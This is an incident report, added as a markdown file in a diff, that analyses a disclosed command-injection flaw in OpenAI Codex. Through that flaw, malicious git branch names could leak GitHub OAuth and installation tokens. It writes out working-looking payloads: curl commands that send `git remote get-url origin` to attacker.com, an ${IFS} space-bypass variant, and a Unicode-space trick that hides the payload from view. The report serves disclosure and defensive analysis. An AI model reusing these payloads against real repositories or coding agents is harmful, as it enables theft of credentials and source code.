@@ -1,0 +1,393 @@
+---
+id: "AAGF-2026-029"
+title: "OpenAI Codex GitHub OAuth Token Exposure via Branch Name Command Injection"
+status: "reviewed"
+date_occurred: "2024-12-01"         # Approximate — when Codex cloud launched with GitHub OAuth integration; vulnerability existed from that point
+date_discovered: "2025-12-16"       # BeyondTrust Phantom Labs discovery
+date_reported: "2026-03-30"         # First public disclosure: BeyondTrust blog + SiliconANGLE + SecurityWeek (simultaneous)
+date_curated: "2026-05-06"
+date_council_reviewed: "2026-05-06"
+
+# Classification
+category: ["Unauthorized Data Access", "Tool Misuse", "Supply Chain Compromise"]
+severity: "High"
+agent_type: ["Coding Assistant"]
+agent_name: "OpenAI Codex"
+platform: "OpenAI Codex"
+industry: "Software Development / Open Source / SaaS"
+
+# Damage classification
+actual_vs_potential: "near-miss"
+potential_damage: "High — GitHub OAuth tokens (and, via the @codex PR review path, Installation Access Tokens with potential org-wide scope) could be silently exfiltrated from any developer running Codex against an attacker-influenced repository. If exploited: read/write access to private source code, injection of malicious commits, lateral movement through organizational GitHub, theft of secrets embedded in repositories (API keys, credentials, infrastructure configs), and supply chain attacks if the compromised developer maintained public packages. BeyondTrust estimated the attack 'could be automated to compromise multiple users' — a PoC extrapolation, not a confirmed exploitation metric."
+intervention: "BeyondTrust Phantom Labs responsible disclosure to OpenAI via BugCrowd on December 16, 2025. OpenAI classified Critical P1, deployed initial hotfix within ~1 week, and completed full 4-phase server-side remediation by February 5, 2026. No confirmed in-the-wild exploitation. No CVE was assigned."
+
+# Impact
+financial_impact: "Not quantified — no confirmed exploitation; potential impact includes repository compromise and supply chain risk"
+financial_impact_usd: null
+refund_status: "unknown"
+refund_amount_usd: null
+affected_parties:
+  count: null                        # No confirmed exploitation; potential scope: all Codex users who authorized GitHub integration
+  scale: "widespread"                # All Codex users with GitHub OAuth integration were potentially vulnerable
+  data_types_exposed: ["credentials", "source_code"]  # GitHub OAuth tokens + all repo contents accessible via those tokens
+
+# Damage Timing
+damage_speed: "instantaneous"        # Token exfiltration would complete in milliseconds once triggered; no confirmed exploitation
+damage_duration: "unknown"           # If a token were stolen, duration until token revocation; short-lived tokens limit the window
+total_damage_window: "unknown"       # Vulnerability existed from Codex GitHub OAuth launch (~late 2024) through remediation (Feb 5, 2026)
+
+# Recovery
+recovery_time: "not required"        # Server-side fix; no user action required; no confirmed exploitation
+recovery_labor_hours: null
+recovery_cost_usd: null
+recovery_cost_notes: "4-phase vendor remediation over ~7 weeks (Dec 16, 2025 – Feb 5, 2026); no user-side recovery required"
+full_recovery_achieved: "yes"        # Server-side fix; no confirmed exploitation; no user action required
+
+# Business Impact
+business_scope: "multi-org"          # All organizations whose developers use Codex with GitHub integration
+business_criticality: "high"
+business_criticality_notes: "GitHub OAuth tokens carried read/write access to all authorized repositories; @codex PR review path yielded GitHub Installation Access Tokens with potential org-wide scope; supply chain risk if compromised developer maintained public packages"
+systems_affected: ["source-code", "ci-cd", "credentials"]
+
+# Vendor Response
+vendor_response: "fixed"
+vendor_response_time: "1-7 days"     # Initial hotfix within ~1 week; full remediation ~7 weeks; public disclosure 3.5 months after report
+
+# Presentation
+headline_stat: "Malicious branch name silently exfiltrates GitHub OAuth tokens — @codex review path yields org-wide Installation Access Tokens with zero user interaction"
+operator_tldr: "Audit all AI coding agents for unsanitized shell parameter injection and ensure GitHub integrations use minimal-scope, short-lived tokens tied to specific task operations — never long-lived OAuth tokens embedded in process-readable URLs"
+containment_method: "third_party"    # BeyondTrust responsible disclosure prompted the fix
+public_attention: "high"             # Multiple tier-1 security press outlets, day-of coverage
+
+# Framework References
+framework_refs:
+  mitre_atlas: ["AML.T0083", "AML.T0098", "AML.T0085.001", "AML.T0086", "AML.T0053"]
+  owasp_llm: ["LLM02:2025", "LLM06:2025", "LLM03:2025"]
+  owasp_agentic: ["ASI02:2026", "ASI03:2026", "ASI04:2026", "ASI05:2026"]
+  ttps_ai: ["2.9", "2.12", "2.15", "2.5.4"]
+
+# Relationships
+related_incidents: ["AAGF-2026-016"]
+pattern_group: "agentic-ide-vulnerability-class"
+tags: ["command-injection", "os-command-injection", "oauth-token-exposure", "github-integration", "branch-name-injection", "shell-injection", "unicode-obfuscation", "ifs-bypass", "installation-access-token", "codex", "openai", "ai-coding-agent", "credential-exfiltration", "supply-chain", "responsible-disclosure", "cwe-78", "no-cve", "beyondtrust", "p1-critical", "git-remote-url", "plaintext-credentials"]
+
+# Metadata
+sources:
+  - "SecurityWeek: https://www.securityweek.com/openai-codex-vulnerability-could-have-exposed-github-tokens/"
+  - "The Hacker News: https://thehackernews.com/2026/03/openai-codex-flaw-could-have-exposed.html"
+  - "SiliconANGLE: https://siliconangle.com/2026/03/30/researchers-expose-openai-codex-flaw-that-could-leak-github-oauth-tokens/"
+  - "BankInfoSecurity: https://www.bankinfosecurity.com/openai-codex-bug-could-expose-github-tokens-a-27066"
+  - "VentureBeat: https://venturebeat.com/ai/six-exploits-ai-coding-agents-nine-months/"
+  - "BeyondTrust Phantom Labs blog (primary source — 403 at fetch time, extensively quoted across 8+ secondary sources)"
+researcher_notes: "No CVE was assigned — do not reference 'CVE-2026' without this clarification. The MrCloudBook headline implied a CVE that does not exist. BeyondTrust is the disclosing researcher and a commercial credential management vendor — extrapolations about automation potential and multi-user compromise are PoC projections, not confirmed exploitation metrics. OpenAI's Critical P1 classification is confirmed across multiple independent outlets. The @codex PR review variant (Variant 3) is the most severe because it yields GitHub Installation Access Tokens with potential org-wide scope, not just single-user OAuth tokens. The Unicode Ideographic Space obfuscation technique (U+3000 × 94) is notable attacker tradecraft: the Codex UI displayed only 'main' while the shell received the full malicious payload. Related to AAGF-2026-016 (IDEsaster) — same pattern-group of AI coding agents accumulating credentials without hardened input handling, different attack surface (cloud container setup vs. IDE layer)."
+council_verdict: "Well-evidenced near-miss with a genuine systemic root cause; severity rating is defensibly conservative; the @codex IAT variant's org-wide blast radius is the most underweighted element and should be called out more prominently, while BeyondTrust's automation-at-scale projections must remain marked as PoC extrapolation throughout."
+---
+
+# OpenAI Codex GitHub OAuth Token Exposure via Branch Name Command Injection
+
+## Executive Summary
+
+In December 2025, security researchers at BeyondTrust Phantom Labs discovered that OpenAI Codex was vulnerable to OS command injection via unsanitized git branch names, allowing an attacker to silently exfiltrate the GitHub OAuth tokens that Codex embedded in plaintext in git remote URLs during container setup. The most severe variant — triggering Codex via a `@codex` PR review comment — yielded GitHub Installation Access Tokens carrying potential org-wide repository permissions, with no user interaction beyond pointing Codex at the repository. OpenAI classified the finding Critical P1 and completed a 4-phase server-side remediation by February 5, 2026. No CVE was assigned and no confirmed exploitation in the wild occurred before the March 30, 2026 public disclosure.
+
+---
+
+## Timeline
+
+| Date | Event |
+|------|-------|
+| ~2024-12 | OpenAI Codex launches with GitHub OAuth integration; vulnerability exists from launch |
+| 2025-12-16 | Tyler Jespersen, Simon Stewart, and Fletcher Davis (BeyondTrust Phantom Labs) discover the branch name command injection and OAuth token exposure; report to OpenAI via BugCrowd |
+| ~2025-12-23 | OpenAI deploys initial hotfix (input validation) — approximately 1 week after report |
+| ~2026-01 | Phase 2 remediation: stronger shell escaping with proper quoting on the branch parameter |
+| 2026-01-30 | Phase 3 remediation: token exposure controls — reduced token visibility in git remote URL |
+| 2026-02-05 | Phase 4 (full remediation): reduced OAuth token scope and lifetime during task execution; OpenAI formally classifies Critical P1 |
+| 2026-03-30 | BeyondTrust Phantom Labs publishes findings; simultaneous independent coverage in SiliconANGLE, SecurityWeek, and The Hacker News — 3.5-month responsible disclosure window |
+
+---
+
+## What Happened
+
+When a developer pointed OpenAI Codex at a GitHub repository, Codex spun up a managed container, authenticated to GitHub using an OAuth token embedded in the git remote URL in the form `https://<oauth-token>@github.com/owner/repo.git`, and cloned the specified branch. The branch name — supplied as a user-controlled parameter in the HTTP POST request to Codex's task creation API — was passed directly into shell commands (`git fetch`, `git checkout`) without sanitization or escaping.
+
+This meant a branch name like `main; curl https://attacker.com/exfil?t=$(git remote get-url origin)` would be interpreted by Bash literally: first execute the git command, then run curl. Because the OAuth token was embedded in the remote URL in cleartext, `git remote get-url origin` returned it verbatim, and curl transmitted it to the attacker's server.
+
+The researchers identified three distinct attack variants of escalating severity.
+
+**Variant 1 — Manual (single target):** An attacker creates a branch with a malicious name in a repository they control, then shares the repository with a target developer. When the developer runs Codex against that branch, their GitHub OAuth token is silently exfiltrated.
+
+**Variant 2 — Automated (no post-setup interaction):** An attacker with write access to a repository sets the malicious branch as the repository's *default branch* via the GitHub API. Any subsequent user who points Codex at that repository has their token exfiltrated automatically — no social engineering required beyond the initial repository access.
+
+**Variant 3 — @codex PR review (most severe):** Referencing `@codex` in a GitHub pull request comment triggers Codex to spin up a code review container. The branch name in this context comes from the PR metadata — which an attacker can influence by naming their feature branch maliciously and opening a PR. This variant exfiltrates **GitHub Installation Access Tokens**, which carry organization-wide repository permissions rather than single-user scope. An adversary gaining an Installation Access Token could access every repository in the organization without the targeted user being aware.
+
+A separate finding documented that the Codex CLI stored credentials in plaintext in `~/.codex/auth.json` (Unix) and `%USERPROFILE%\.codex\auth.json` (Windows), containing OpenAI API keys, access tokens, and refresh tokens, falling back to plaintext storage when the OS keyring was unavailable.
+
+The payload construction demonstrated two bypass techniques against GitHub's branch naming validation. First, `${IFS}` substitution: GitHub's branch naming rules block literal space characters, but `${IFS}` evaluates to a space at Bash runtime, passing validation while executing correctly in the shell. Second, and more operationally significant, **Unicode Ideographic Space obfuscation (U+3000)**: 94 Unicode Ideographic Space characters were appended after "main", followed by `|| true`, then the malicious payload. The Codex UI rendered only "main" — the payload was completely invisible to the developer — while the shell executed the full string. As the researchers summarized: *"A developer sees 'main.' The shell sees curl exfiltrating their token."*
+
+---
+
+## Technical Analysis
+
+### Root Mechanism: CWE-78 OS Command Injection
+
+The vulnerability class is standard OS command injection (CWE-78) applied to an AI coding agent's container orchestration layer. The git authentication pattern — embedding the OAuth token in the HTTPS remote URL (`https://<token>@github.com/...`) — is a decades-old path-of-least-resistance for containerized git operations. The token must be available at clone time, and the credential-in-URL format is the default approach in automated environments that lack a keyring or credential helper.
+
+The failure was treating the branch name parameter as a trusted git argument rather than untrusted user input. When the container setup shell script received the branch name from the API request and constructed:
+
+```bash
+git fetch origin <branch_name>
+git checkout <branch_name>
+```
+
+without quoting or escaping, any shell metacharacter in `<branch_name>` could break out of the git command context.
+
+### OAuth Token Extractability
+
+The token's extractability was compounded by its storage location. Embedded in the remote URL, it was trivially readable via:
+
+```
+git remote get-url origin
+```
+
+which returned the full authenticated URL including the token in cleartext. The payload only needed to invoke this git subcommand and pipe the result to an exfiltration endpoint.
+
+### Bypass Technique 1: `${IFS}` Space Substitution
+
+GitHub's branch naming validation rejects branch names containing literal ASCII spaces. The `${IFS}` Internal Field Separator environment variable, when used unquoted in Bash, expands to a space character at runtime. This allowed the attacker to construct shell commands that:
+- Passed GitHub's branch name validation (no literal spaces)
+- Executed correctly in Bash (spaces appear at runtime via IFS expansion)
+
+Example fragment: `main;curl${IFS}'https://attacker.com/exfil?t='$(git${IFS}-C${IFS}/workspace/REPO${IFS}remote${IFS}get-url${IFS}origin)`
+
+### Bypass Technique 2: Unicode Ideographic Space Obfuscation (U+3000)
+
+The more dangerous technique exploited the visual rendering difference between ASCII space (U+0020) and the Unicode Ideographic Space character (U+3000). The full payload was structured as:
+
+```
+main[U+3000 × 94] || true; <malicious_curl_command>
+```
+
+The Codex UI displayed only "main" because the Ideographic Space characters at the end of the visible string were not rendered as meaningful content. The shell, however, processed the entire string — the `|| true` prevented error propagation from the padding characters, and the semicolon-separated payload then executed. A developer reviewing the Codex task setup would see a branch named "main" with no indication of the embedded payload.
+
+### The @codex Installation Access Token Variant
+
+GitHub Apps installed on an organization receive Installation Access Tokens (IATs) scoped to the repositories they are authorized for. When Codex is installed as a GitHub App (to enable the `@codex` PR review feature), the container it spins up for a PR review operates with an IAT rather than a user OAuth token.
+
+IATs differ from user OAuth tokens in a critical dimension: they carry the permissions of the GitHub App installation, which may include all repositories in an organization. A user OAuth token is bounded by one developer's access; an IAT can be bounded by an entire organization's repository set. This makes Variant 3 a potential organization-wide credential compromise, not merely a single-developer credential theft.
+
+### CLI Plaintext Credential Storage
+
+The Codex CLI's fallback behavior — storing credentials in plaintext JSON at `~/.codex/auth.json` — represents a separate attack surface. Any process with read access to the user's home directory, or any malware on the developer's workstation, could read OpenAI API keys, access tokens, and refresh tokens without the command injection chain. This is a defense-in-depth failure: even if the token exfiltration vector were closed, plaintext credential storage on disk creates a persistent risk.
+
+---
+
+## Root Cause Analysis
+
+**Proximate cause:** Codex's container setup script passed the user-controlled branch name parameter directly into shell commands without sanitization, and the GitHub OAuth token was embedded in the git remote URL in cleartext, making it trivially readable once arbitrary command execution was achieved.
+
+**Why 1:** Why could a malicious branch name execute arbitrary shell commands?
+Codex treated the branch name as a trusted git argument rather than untrusted user input. The container setup scripts were written to automate a developer workflow — they were not threat-modeled against adversarial input from outside the system. The branch name parameter was interpolated directly into shell command strings.
+
+**Why 2:** Why was there no input sanitization on the branch parameter?
+The git authentication pattern used (OAuth token embedded in the HTTPS remote URL) was inherited from earlier git tooling as the path-of-least-resistance for containerized authentication. This legacy pattern was carried forward without re-evaluating the trust model: in original git tooling, the branch name comes from a developer typing at a terminal; in Codex, it comes from an HTTP API that any user (or attacker) can call with arbitrary input.
+
+**Why 3:** Why was the OAuth token embedded in the git remote URL at all?
+The HTTPS credential-in-URL format is the default mechanism for git authentication in containerized, non-interactive environments. The token must be available at clone time with no keyring or user prompt. The format `https://<token>@github.com/...` is documented and widely used in CI/CD pipelines. The problem is that it makes the credential readable by any process that can execute `git remote get-url origin` — a one-line command — rather than requiring privileged access to a secure credential store.
+
+**Why 4:** Why wasn't the OAuth token scope minimized to the specific task at hand?
+The Codex GitHub OAuth integration requested broad permissions to maximize feature compatibility — read/write on authorized repositories, access to workflows, issues, and PRs. Least-privilege scoping at the task-execution layer (e.g., a read-only token scoped only to the specific repository and commit for the duration of a single Codex task) was not enforced. The `@codex` variant compounded this by operating with Installation Access Tokens carrying potential org-wide scope.
+
+**Why 5 / Root cause:** AI coding agents accumulate broad, long-lived credentials at session initialization and hold them in plaintext-accessible locations, while inheriting decades-old shell authentication patterns (credential-in-URL) without the input hardening that becomes mandatory when those patterns are exposed to attacker-controlled parameters over an HTTP API. The infrastructure was designed to maximize developer productivity — minimizing friction between "pointing Codex at a repo" and "code appears" — with the implicit assumption that the inputs to that workflow (repository URLs, branch names) come from a trusted developer rather than an adversary.
+
+**Root cause summary:** The credential-in-URL git authentication pattern, designed for trusted CI/CD contexts, was reused in an AI coding agent that accepts attacker-controlled branch names via an HTTP API, without the input sanitization required when a legacy shell pattern is exposed to an untrusted input surface.
+
+---
+
+## Impact Assessment
+
+**Severity:** High
+
+**Severity justification:** OpenAI classified this Critical P1 internally. High (rather than Critical) is appropriate for the AgentFail severity scale because: (1) no confirmed exploitation in the wild occurred; (2) the patch was fully server-side with no user action required; (3) short-lived tokens reduced the exploitation window. The @codex IAT variant with org-wide scope keeps this at High rather than Medium — the potential blast radius, had it been exploited, was organization-wide repository access.
+
+**Who was affected:**
+- All developers who used OpenAI Codex (ChatGPT website, CLI, SDK, IDE Extension) with GitHub OAuth integration enabled
+- Organizations whose developers used the `@codex` PR review feature — potentially subject to Installation Access Token exposure with org-wide scope
+- No confirmed individual victims; potential scope was every authorized Codex user
+
+**What was affected:**
+- GitHub OAuth tokens (read/write access to all repositories the developer authorized for the ChatGPT Codex Connector app)
+- GitHub Installation Access Tokens via the `@codex` variant (potential org-wide repository permissions)
+- Repository contents accessible via stolen tokens: source code, embedded secrets (API keys, credentials, infrastructure configs)
+- Supply chain integrity: a compromised developer maintaining public packages could have had malicious commits injected via stolen tokens
+
+**Quantified impact (where known):**
+- Users affected: null (no confirmed exploitation)
+- Financial impact: not quantified
+- Confirmed exploitation: none
+- Token scope if exploited: read/write on authorized repos; org-wide via @codex variant
+- Vulnerability window: approximately 14 months (late 2024 – February 5, 2026)
+- Remediation timeline: 4 phases over ~7 weeks
+
+**Containment:** Contained entirely through responsible disclosure. BeyondTrust reported the vulnerability on December 16, 2025; OpenAI deployed an initial hotfix within one week, and completed full remediation by February 5, 2026. All fixes were server-side — no user action was required. The 3.5-month responsible disclosure window before public disclosure gave OpenAI time to fully remediate before the vulnerability was publicly known. No evidence of in-the-wild exploitation was found before or after disclosure.
+
+---
+
+## How It Could Have Been Prevented
+
+1. **Treat all HTTP API parameters as untrusted user input, regardless of downstream use.** The branch name parameter arrived via an HTTP API call and was passed to a shell command. Any parameter from an external HTTP request must be sanitized before inclusion in shell commands — this is standard secure coding practice that applies irrespective of what the parameter is "supposed" to contain. Parameterized git command invocations (passing arguments as an array to exec, never via string interpolation) would have prevented command injection entirely.
+
+2. **Never embed credentials in process-readable locations.** The OAuth token embedded in `https://<token>@github.com/...` was readable by any process that could run `git remote get-url origin`. Using a git credential helper backed by a secrets manager, environment variable injection at runtime (not encoded in the URL), or ephemeral credential storage outside the git config would have removed the credential from the injection payload path.
+
+3. **Enforce least-privilege, task-scoped tokens.** The Codex OAuth integration should have requested a read-only token scoped to the specific repository and commit for the duration of one task, not a broad long-lived token covering all authorized repositories. The `@codex` variant amplified blast radius by using Installation Access Tokens with org-wide scope — these should have been scoped to the specific repository in the PR.
+
+4. **Input validation on branch names before shell execution.** A strict allowlist of valid branch name characters (alphanumeric, `-`, `_`, `/`, `.`) applied server-side before any shell invocation would have rejected payloads containing `;`, `$`, backticks, `||`, or `&&`. This would not have prevented the Unicode obfuscation bypass unless Unicode normalization was also applied — but it would have blocked the simpler `${IFS}`-based payloads.
+
+5. **Detect and normalize Unicode homoglyphs and control characters in API inputs.** The Ideographic Space (U+3000) obfuscation technique worked because the input pipeline did not normalize Unicode or strip characters outside expected branch name character ranges. Applying Unicode normalization (NFC/NFKC) and stripping non-ASCII characters from branch name parameters would have surfaced the hidden payload.
+
+6. **Use secure credential storage for the CLI.** The Codex CLI's fallback to plaintext `~/.codex/auth.json` when the OS keyring is unavailable should have been replaced with a hard failure or a prompt for alternative secure storage — never silent plaintext fallback for credentials that include refresh tokens.
+
+---
+
+## How It Was / Could Be Fixed
+
+**Actual remediation taken (4-phase server-side fix):**
+
+- **Phase 1 (~December 23, 2025):** Initial input validation hotfix deployed within ~1 week of report. Basic filtering of shell metacharacters from the branch name parameter.
+
+- **Phase 2 (~January 2026):** Stronger shell escaping deployed. The branch parameter was properly quoted in shell command construction, preventing metacharacter escape from the argument context even if validation was bypassed.
+
+- **Phase 3 (~January 30, 2026):** Token exposure controls. Reduced token visibility in the git remote URL — the token is no longer exposed in the full remote URL string returned by `git remote get-url origin`. Mechanism: either credential helper substitution or URL rewriting to remove the inline credential.
+
+- **Phase 4 (February 5, 2026):** Reduced OAuth token scope and lifetime during task execution. Tokens issued for Codex task execution are now scoped to the minimum required permissions for the specific task and expire after the task completes. OpenAI formally classifies the finding Critical P1 and considers remediation complete.
+
+All fixes were server-side — no user update, reinstallation, or token revocation was required.
+
+**Additional recommended fixes (not confirmed taken):**
+
+- Migrate CLI credential storage from plaintext JSON fallback to mandatory OS keyring with no fallback path
+- Implement Unicode normalization and non-ASCII stripping on all branch name parameters before any processing
+- Apply parameterized exec invocations (arg array, not string interpolation) rather than relying on shell escaping as the last line of defense
+- Add automated security tests for command injection via branch name parameters to regression test suite
+- Scope the `@codex` GitHub App installation to per-repository permissions rather than org-wide Installation Access Token issuance
+
+---
+
+## Solutions Analysis
+
+### 1. Parameterized Command Execution (Input Sanitization at the Architectural Level)
+- **Type:** Input Validation and Sanitization
+- **Plausibility:** 5/5 — Passing command arguments as an array to exec (rather than constructing shell command strings via interpolation) eliminates the injection surface entirely. The operating system passes each array element as a discrete argument; shell metacharacters in argument values are never interpreted by the shell. This is the textbook fix for CWE-78.
+- **Practicality:** 5/5 — This is a standard secure coding pattern available in every language and runtime. For Python subprocess: `subprocess.run(["git", "fetch", "origin", branch_name], ...)` — branch_name is passed as data, not code, regardless of its content. Zero operational overhead, no validation logic to maintain, no bypass vectors.
+- **How it applies:** Replacing `shell=True` string interpolation with parameterized exec invocations in the container setup scripts would have made the branch name injection literally impossible — the OS would have passed any string, including the `${IFS}` payload, as a literal git argument with no shell interpretation.
+- **Limitations:** Requires that every command invocation in the container setup pipeline be audited and converted. Shell scripts that source other scripts, use eval, or invoke wrappers may have additional injection surfaces that need separate review.
+
+### 2. Ephemeral Scoped Credentials (Credential Architecture Redesign)
+- **Type:** Permission Scoping / Least Privilege
+- **Plausibility:** 5/5 — Issuing a task-scoped, short-lived token for each Codex task — with permissions limited to the specific repository and the read operations required — directly limits the blast radius of any token exfiltration. Even if the injection succeeded, the stolen token would expire within minutes and could only access one repository.
+- **Practicality:** 4/5 — GitHub's fine-grained personal access tokens and GitHub App Installation Tokens both support repository-scoped, time-limited issuance. OpenAI Phase 4 remediation moved in this direction. The engineering investment is moderate: a token issuance service that mints per-task credentials rather than reusing a session-level token.
+- **How it applies:** An attacker exfiltrating a 5-minute, read-only, single-repository token gains far less than one exfiltrating a long-lived, write-enabled, multi-repository OAuth token. For the `@codex` variant, scoping the Installation Access Token to the single PR repository removes the org-wide exposure.
+- **Limitations:** Does not prevent the command injection itself — only reduces the value of a stolen credential. If the attacker can trigger repeated task executions, they can continue harvesting short-lived tokens. Requires ongoing token lifecycle management.
+
+### 3. Credential Store Isolation (Remove Credentials from Shell-Accessible Context)
+- **Type:** Sandboxing and Isolation
+- **Plausibility:** 5/5 — The token's extractability depended entirely on its presence in a location readable by `git remote get-url origin`. Storing credentials in a git credential helper backed by a secrets manager (rather than the remote URL) or injecting them as environment variables that are not URL-encoded in the remote would remove the credential from the injection payload path.
+- **Practicality:** 4/5 — Git credential helpers are a standard mechanism. The container setup would need to configure git to use a helper backed by a secrets injection at container startup, rather than pre-embedding the token in the remote URL. Some complexity in container orchestration, but well-understood infrastructure patterns (e.g., Vault agent, AWS Secrets Manager sidecar).
+- **How it applies:** If `git remote get-url origin` returned `https://github.com/owner/repo.git` (no embedded token), the injection payload would have no credential to exfiltrate. The attack chain would still achieve code execution but would not steal a usable GitHub credential.
+- **Limitations:** Does not prevent the command injection itself. An attacker with arbitrary command execution inside the container could potentially access other credential surfaces (environment variables, mounted secrets volumes) if not isolated. Requires reviewing all credential injection paths in the container environment.
+
+### 4. Unicode Normalization and Character Allowlisting
+- **Type:** Input Validation and Sanitization
+- **Plausibility:** 4/5 — The Unicode Ideographic Space obfuscation technique worked because the input pipeline accepted non-ASCII characters in branch names. Applying Unicode normalization (NFKC) before validation and enforcing an ASCII-only allowlist for branch names (`[a-zA-Z0-9._/-]`) would have caused the obfuscated payload to fail validation visibly.
+- **Practicality:** 4/5 — Unicode normalization is a one-line library call in any modern runtime. Adding it to the API input validation layer is low effort. GitHub itself enforces ASCII-compatible branch name rules; applying the same normalization server-side in Codex's API aligns with GitHub's existing constraints.
+- **How it applies:** Normalizing `main[U+3000 × 94]|| true; curl ...` to NFC/NFKC and then stripping non-ASCII characters would have collapsed the payload to `main|| true; curl ...` — which would then be caught by metacharacter validation. The attack would have been detected rather than silently executed.
+- **Limitations:** This is a defense-in-depth measure, not a root fix. The `${IFS}` bypass uses only ASCII characters; it would not be caught by Unicode normalization. Parameterized execution (Solution 1) remains the correct architectural fix; normalization adds a detection layer for a specific obfuscation technique.
+
+### 5. Behavioral Monitoring for Credential Exfiltration Patterns
+- **Type:** Monitoring and Detection
+- **Plausibility:** 3/5 — The attack pattern — git remote URL read followed by outbound HTTP request containing the result — is detectable with network egress monitoring in the container environment. Codex containers executing code review tasks should have narrow, predictable egress requirements; an unexpected curl to an external IP is an anomaly.
+- **Practicality:** 3/5 — Container-level network egress filtering and logging is achievable with standard infrastructure (network policies, eBPF-based monitoring). The challenge is baseline definition: code review containers may legitimately make outbound calls to package registries, documentation endpoints, or test servers. Distinguishing legitimate from malicious egress requires policy tuning.
+- **How it applies:** A network policy blocking egress from Codex review containers to all destinations except GitHub API endpoints would have prevented curl-based exfiltration. Anomaly detection on container egress (destination IP not in allowlist, User-Agent header from curl vs. expected SDK clients) would have flagged the attack in progress.
+- **Limitations:** Reactive — detection occurs after the exfiltration attempt, though blocking via egress policy can prevent the credential from reaching the attacker. Sophisticated attackers can exfiltrate via DNS queries or encode data in HTTP requests to whitelisted endpoints. Does not address the root injection vulnerability.
+
+---
+
+## Related Incidents
+
+| Incident | Connection |
+|----------|------------|
+| [[AAGF-2026-016]] | IDEsaster — same pattern group (`agentic-ide-vulnerability-class`). IDEsaster attacked the IDE/editor layer via prompt injection using workspace config files and MCP configs. Codex branch injection attacks the cloud agent's container setup via unsanitized OS command input. Both demonstrate the same systemic failure: AI coding agents accumulate broad credentials and execute shell commands without hardened input handling, but at different attack surfaces (IDE config vs. cloud container orchestration). VentureBeat documented this incident as 1 of 6 exploits against AI coding agents in a 9-month period, all following the same pattern: "An AI coding agent held a credential, executed an action, and authenticated to a production system without a human session anchoring the request." |
+
+**Pattern group:** `agentic-ide-vulnerability-class` — AI coding agents that accumulate credentials at session initialization and execute shell commands with attacker-influenced parameters create a recurring vulnerability class. The Codex branch injection variant differs from the IDEsaster prompt-injection-via-file variant, but the root architectural failure is identical: the agent holds live credentials, executes system-level operations, and the input to those operations arrives via an untrusted channel without the validation required for that trust model.
+
+---
+
+## Strategic Council Review
+
+### Challenger Findings
+
+1. **The "near-miss" framing relies on an unverifiable negative.** The report states "no confirmed exploitation in the wild" as a near-certainty, but the evidence base for this is thin. BeyondTrust had no visibility into Codex container logs or OpenAI's telemetry prior to disclosure. OpenAI's statement of no confirmed exploitation is self-reported by the vendor, not independently verified. The vulnerability existed for approximately 14 months before discovery; BeyondTrust found it through deliberate research, not through forensic investigation of a known attack. The absence of discovered exploitation is not equivalent to confirmed non-exploitation — particularly for a credential theft attack that would leave traces primarily in attacker infrastructure, not in OpenAI's systems.
+
+2. **The @codex IAT variant's severity is underweighted relative to the analysis it receives.** The report correctly identifies Variant 3 as "most severe" and describes org-wide Installation Access Token scope, but the severity rating stays at "High" with the justification that "no confirmed exploitation occurred." The IAT variant could, by the report's own account, grant an attacker access to every repository in an organization by having a developer invoke `@codex` on a single PR — which in a public repository requires zero social engineering beyond submitting a PR. This is a distinctly different risk profile from Variant 1, yet both are captured under the same "High" severity rating. The report does not adequately reconcile why a publicly-triggerable, org-wide credential compromise path still warrants only High rather than Critical.
+
+3. **The root cause 5 Whys analysis bottoms out at a design philosophy, not a root cause.** "Why 5 / Root cause" concludes with: "AI coding agents accumulate broad, long-lived credentials at session initialization... designed to maximize developer productivity." This is an observation about product design tradeoffs, not a root cause. A genuine root cause would identify the specific decision point where no one modeled the threat, or the organizational process that allowed container setup scripts to ship without security review of the injection surface. As written, the root cause is unfalsifiable and non-actionable — it attributes the failure to "implicit assumption" without tracing that assumption to a specific person, process, or review gate that failed.
+
+4. **BeyondTrust's "could be automated to compromise multiple users" claim is presented with insufficient skepticism.** The report's `potential_damage` field includes this language with a parenthetical noting it is "a PoC extrapolation, not a confirmed exploitation metric," and the `researcher_notes` section flags it. However, the claim still appears in the frontmatter `potential_damage` and in the executive narrative without full context. BeyondTrust is a commercial credential management vendor with a financial interest in demonstrating the severity of OAuth token exposure vulnerabilities. The automation scenario is technically plausible, but its inclusion in a key metadata field — where it will drive the headline stat — without equal-weight qualification understates the uncertainty and serves the researcher's marketing interests.
+
+5. **The Phase 4 remediation timeline framing introduces a discrepancy.** The timeline and remediation section both describe OpenAI deploying Phase 1 input validation within "~1 week" of the December 16 report. Yet Phase 4 (reduced OAuth token scope and lifetime) is dated February 5, 2026, with the notation "OpenAI formally classifies Critical P1." If OpenAI classified this P1 only at Phase 4 completion — 7 weeks after the initial report — that is a significantly different vendor response story than "classified Critical P1 within days." The phrasing in the remediation section and timeline creates ambiguity: was P1 classification at report time, or at final remediation? This matters for assessing vendor response quality.
+
+6. **The CLI plaintext credential storage finding is treated as a co-equal vulnerability when it is arguably a distinct incident.** The `~/.codex/auth.json` plaintext storage issue appears in the technical analysis and solutions sections but is not integrated into the root cause 5 Whys or the severity justification. Including it enriches the report but obscures whether this was reported alongside the branch injection or separately, whether it was remediated in the same 4-phase process, and whether it was also classified P1. A reader assessing operator risk cannot tell whether patching Codex today also closes the CLI credential storage exposure.
+
+### Steelman Defense
+
+1. **"No confirmed exploitation" is the strongest near-miss evidence available for a server-side-only vulnerability — and it is credible here.** For a command injection vulnerability in a cloud service, OpenAI does have meaningful telemetry: container egress logs, API call patterns, and outbound network traffic that would reveal the distinctive `curl https://attacker.com/...?t=<token>` exfiltration signature. If exploitation had occurred at scale, OpenAI would plausibly have discovered it through their own monitoring during the 7-week remediation window, during which they were actively analyzing the vulnerability. The responsible disclosure window also means BeyondTrust researchers would have been watching for public evidence of exploitation between December 2025 and March 2026 — and no such evidence surfaced across any of the 8+ outlets covering the disclosure. "No confirmed exploitation" from a vendor who was actively looking for it during remediation is meaningfully different from a vendor who only learned about the vulnerability at public disclosure.
+
+2. **High severity (not Critical) for a pure near-miss is defensible and consistent with the AgentFail scale.** The report acknowledges OpenAI's internal Critical P1 classification while applying the AgentFail "High" rating, and explicitly justifies the gap: no confirmed exploitation, server-side fix required no user action, and short-lived tokens reduced the exploitation window. This is not inconsistency — it reflects the difference between a vendor's internal incident classification (which measures worst-case potential from an operational response standpoint) and AgentFail's severity scale (which should reflect what actually happened). A pure near-miss that required no user action and left no confirmed victims is correctly rated below a confirmed exploitation event with equivalent blast radius potential.
+
